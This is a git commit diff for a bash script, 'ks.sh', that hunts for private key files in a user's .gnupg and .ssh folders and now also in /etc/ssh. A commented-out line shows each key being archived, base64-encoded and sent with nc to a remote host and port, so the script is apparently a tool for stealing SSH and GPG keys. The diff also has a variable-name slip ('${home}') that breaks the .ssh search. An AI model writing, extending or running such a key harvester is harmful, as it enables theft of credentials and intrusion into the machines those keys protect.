47d5acd92faf8b1202a5a66e0892959f85918da6
wilsonfisk <wilson.fisk.secure@gmail.com>
2017-11-04 20:20:09 -0400

    Updated 'ks.sh' to search for SSH server keys.

--- ks.sh
+++ ks.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
-.kukolny.cfg
-keys=$(find "${HOME}"/{.gnupg,.ssh} -type f -exec grep -l "PRIVATE" {} \;)
+#. kukolny.cfg
+dir_list=( "${HOME}"/.gnupg "${home}"/.ssh /etc/ssh )
+keys=$(for dir in "${dir_list[@]}"; do find "${dir}" -type f -exec grep -l "PRIVATE" '{}' \;;done)
 for k in $keys; do
     echo "$k"
     #tar -cf- - "$k"|base64 -w0|nc $remote_host:$remote_port
